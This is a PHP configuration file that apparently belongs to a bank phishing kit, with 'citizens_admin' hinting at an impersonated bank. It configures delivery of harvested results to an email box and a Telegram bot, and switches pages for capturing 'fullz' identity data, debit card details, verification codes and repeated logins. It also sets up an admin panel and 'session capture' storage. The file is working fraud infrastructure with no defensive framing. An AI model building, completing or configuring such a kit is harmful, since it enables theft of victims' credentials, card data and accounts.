<?php
//email settings
$to = "";  // Results Box

//telegram settings
$chatid = "";  // Chat ID Of You
$boturl = "bot";   // Your Bot API Key (eg: bot212807623:PAEG09rTJt-IxOQ)
$tgresult = "on";  // DON'T change

//page settings
$doublelogin =  "off";
$CFProtection = "off";
$securitypage = "off";
$fullzpage = "off";
$debitpage = "off";
$mailpage = "off";
// only works if mail enabled as it is directly tied to mail
$codepage = "off";

// admin panel credentials
$adminUser = 'admin';
// password: ChangeMe123!
$adminPassHash = '$2y$12$GIrxvYXfb75QHFVCwEfxyO6iQmfrg2cYKfChpvWE9IoIj1TJBHGf.';

// session capture storage configuration
$sessionStoragePath = __DIR__ . '/storage/session_data.json';
$adminSessionName = 'citizens_admin';
?>